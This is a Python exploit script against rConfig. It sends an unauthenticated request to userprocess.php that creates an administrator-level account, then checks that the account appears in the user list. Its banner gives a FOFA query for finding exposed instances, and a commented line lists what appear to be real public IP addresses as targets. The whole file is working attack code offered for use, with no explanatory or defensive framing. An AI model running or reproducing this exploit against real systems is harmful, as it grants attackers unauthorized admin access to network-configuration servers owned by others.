# !/usr/bin/python3
# -*- coding:utf-8 -*-

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder

def title():
    print('+----------------------------------------------------------')
    print('+  fofa:app="rConfig"                                      ')
    print('+  Version: rConfig userprocess.php 任意用户创建漏洞          ')
    print('+----------------------------------------------------------')

def run_proto(target_url):
    vuln_url = target_url + "/lib/crud/userprocess.php"
    referer = target_url + "useradmin.php"
    ran_number = random.randint(1, 999)
    origin = target_url
    multipart_data = MultipartEncoder(
        fields={
            'username': 'pqtest{}'.format(ran_number),
            'password': 'PQtest@{}'.format(ran_number),
            'passconf': 'PQtest@{}'.format(ran_number),
            'email': 'PQtest{}@test.com'.format(ran_number),
            'ulevelid': '9',
            'add': 'add',
            'editid': ''
        }
    )
    headers = {'Content-Type': multipart_data.content_type, "Upgrade-Insecure-Requests": "1", "Referer": referer,
               "Origin": origin}
    cookies = {'PHPSESSID': 'pqtest{}'.format(ran_number)}
    print("正在创建账户.....".format(ran_number, ran_number))
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, timeout=3, allow_redirects=False)
        if "error" not in response.text:
            print("成功创建账户 pqtest{}/PQtest@{}".format(ran_number, ran_number))
            url_poc = requests.get(url='{}/useradmin.inc.php?ipp=All'.format(target_url), timeout=3, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'}, verify=False)
            if url_poc.status_code == 200 and "pqtest{}".format(ran_number) in url_poc.text and 'Admin' in url_poc.text:
                return True
            else:
                return False
        else:
            print("创建失败:{}")
            return False
    except Exception as e:
        print("请求失败:{}".format(e))
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        target_url = '{}://{}:{}'.format(
            proto[i], ip, port)
        if run_proto(target_url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '213.129.92.17:80;213.129.92.17:443;176.62.195.243:443'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')